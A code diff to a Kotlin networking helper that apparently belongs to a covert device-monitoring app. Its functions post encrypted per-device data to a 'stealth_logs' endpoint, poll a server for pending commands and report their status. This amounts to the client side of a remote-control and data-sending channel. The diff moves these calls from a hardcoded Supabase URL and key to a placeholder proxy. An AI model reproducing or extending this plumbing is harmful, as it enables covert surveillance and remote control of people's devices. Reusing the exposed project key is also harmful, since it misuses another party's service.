@@ -16,8 +16,10 @@ object NetUtils {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    private const val SUPABASE_URL = "https://ybhticzotyvyyuxkfkwv.supabase.co"
-    private const val SUPABASE_KEY = "sb_publishable_bhDsYAE3AkjETs8UFGyK_w_p7VyMMsP"
+    private const val PROXY_BASE_URL = "https://your-proxy-server.com"
+    private const val SYNC_ENDPOINT = "$PROXY_BASE_URL/api/v1/sync"
+    private const val COMMANDS_ENDPOINT = "$PROXY_BASE_URL/api/v1/commands"
+    private const val COMMANDS_UPDATE_ENDPOINT = "$PROXY_BASE_URL/api/v1/commands/update"
 
     fun sendLog(deviceId: String, eventType: String, encryptedKey: String, encryptedData: String, callback: (Boolean) -> Unit) {
         val json = JSONObject().apply {
@@ -33,9 +35,7 @@ object NetUtils {
         val body = json.toString().toRequestBody(mediaType)
 
         val request = Request.Builder()
-            .url("$SUPABASE_URL/rest/v1/stealth_logs")
-            .addHeader("apikey", SUPABASE_KEY)
-            .addHeader("Authorization", "Bearer $SUPABASE_KEY")
+            .url(SYNC_ENDPOINT)
             .addHeader("Content-Type", "application/json")
             .post(body)
             .build()
@@ -53,11 +53,9 @@ object NetUtils {
     }
 
     fun fetchPendingCommands(deviceId: String, callback: (String?) -> Unit) {
-        val url = "$SUPABASE_URL/rest/v1/commands?status=eq.pending&select=command&limit=1"
         val request = Request.Builder()
-            .url(url)
-            .addHeader("apikey", SUPABASE_KEY)
-            .addHeader("Authorization", "Bearer $SUPABASE_KEY")
+            .url(COMMANDS_ENDPOINT)
+            .addHeader("Content-Type", "application/json")
             .get()
             .build()
 
@@ -92,12 +90,8 @@ object NetUtils {
         val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
         val body = json.toString().toRequestBody(mediaType)
 
-        val url = "$SUPABASE_URL/rest/v1/commands?command=eq.$command&status=eq.pending"
-
         val request = Request.Builder()
-            .url(url)
-            .addHeader("apikey", SUPABASE_KEY)
-            .addHeader("Authorization", "Bearer $SUPABASE_KEY")
+            .url(COMMANDS_UPDATE_ENDPOINT)
             .addHeader("Content-Type", "application/json")
             .patch(body)
             .build()
